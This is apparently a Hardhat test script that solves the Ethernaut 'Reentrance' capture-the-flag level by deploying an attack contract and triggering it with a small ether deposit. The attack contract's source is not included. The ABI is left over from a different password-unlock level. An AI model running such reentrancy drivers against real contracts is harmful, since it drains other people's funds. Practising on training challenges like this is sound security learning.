const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [
      {
        internalType: "bytes32",
        name: "_password",
        type: "bytes32",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "locked",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes32",
        name: "_password",
        type: "bytes32",
      },
    ],
    name: "unlock",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const contractLevel = "0x0AFc648f6D22390d6642Ebc7e1579fC480FE2278";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(
    contractLevel,
    ethers.utils.parseUnits("1", "ether"),
    "ReentranceFactory"
  );
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  let attackFactory = await ethers.getContractFactory("ReentranceAttack");
  let attackContract = await attackFactory.deploy(challenge.address);
  await attackContract.deployed();
  let b = await ethers.provider.getBalance(challenge.address);
  let contractBalance = await b.toString();
  console.log(
    `balance of contract before (in script): ${JSON.stringify(
      await contractBalance
    )}`
  );
  let amount = ethers.utils.parseUnits("0.01", "ether");
  let tx = await attackContract.attack({
    value: amount,
  });
  await tx.wait(1);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
